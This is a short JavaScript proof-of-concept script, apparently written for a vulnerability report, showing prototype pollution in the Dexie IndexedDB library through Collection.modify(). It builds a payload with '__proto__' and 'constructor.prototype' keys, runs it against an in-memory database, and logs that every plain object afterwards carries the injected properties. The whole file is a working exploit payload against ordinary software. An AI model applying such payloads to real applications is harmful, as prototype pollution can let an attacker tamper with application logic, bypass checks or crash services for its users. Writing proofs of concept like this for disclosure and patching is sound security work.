import Dexie from 'dexie';
import indexedDB from 'fake-indexeddb';
import IDBKeyRange from 'fake-indexeddb/lib/FDBKeyRange';

// poc 2 - Collection.modify() https://dexie.org/docs/Collection/Collection.modify()
const db = new Dexie("PoC", { indexedDB: indexedDB, IDBKeyRange: IDBKeyRange });
db.version(1).stores({friends:"++id, name, age"});
let payload = { "__proto__.polluted3": "polluted3", "constructor.prototype.polluted4": "polluted4" }
db.transaction("rw", db.friends, async () => {
    console.log('====== PoC Test 2 ======');
    await db.friends.bulkPut([ { name: "Foo", age: 20 }, { name: "Bar", age: 30 } ]);
    console.log('before, {}.polluted3 = ', {}.polluted3); // undefined
    console.log('before, {}.polluted4 = ', {}.polluted4); // undefined
    await db.friends .where("age").aboveOrEqual(1).modify(payload);
    console.log('after, {}.polluted3 = ', {}.polluted3); // yes
    console.log('after, {}.polluted4 = ', {}.polluted4); // yes
}).catch (function (e) { console.error(e); });